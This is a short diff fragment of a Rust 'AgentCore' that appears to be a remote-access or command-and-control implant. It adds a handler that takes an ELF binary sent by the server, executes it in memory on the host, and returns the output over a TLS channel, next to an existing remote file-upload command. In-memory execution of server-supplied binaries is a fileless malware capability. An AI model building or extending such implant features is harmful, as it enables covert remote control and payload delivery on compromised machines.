@@ -1018,6 +1018,30 @@ impl AgentCore {
                 tls_writer.write_all(response_str.as_bytes()).await?;
                 tls_writer.write_all(b"\n").await?;
             }
+            Message::LinuxElfExecutionRequest { elf_data, args } => {
+                info!(
+                    "{} Server requested Linux ELF in-memory execution",
+                    styling::SUCCESS_INDICATOR
+                );
+
+                let os = OSDetector::detect_os();
+                let executor = CommandExecutor::new(&os);
+
+                let response = match executor.execute_linux_elf(elf_data, &args).await {
+                    Ok(output) => Message::LinuxElfExecutionResponse {
+                        output,
+                        error: None,
+                    },
+                    Err(e) => Message::LinuxElfExecutionResponse {
+                        output: String::new(),
+                        error: Some(e.to_string()),
+                    },
+                };
+
+                let response_str = serde_json::to_string(&response)?;
+                tls_writer.write_all(response_str.as_bytes()).await?;
+                tls_writer.write_all(b"\n").await?;
+            }
             Message::FileUpload {
                 remote_path,
                 content_b64,
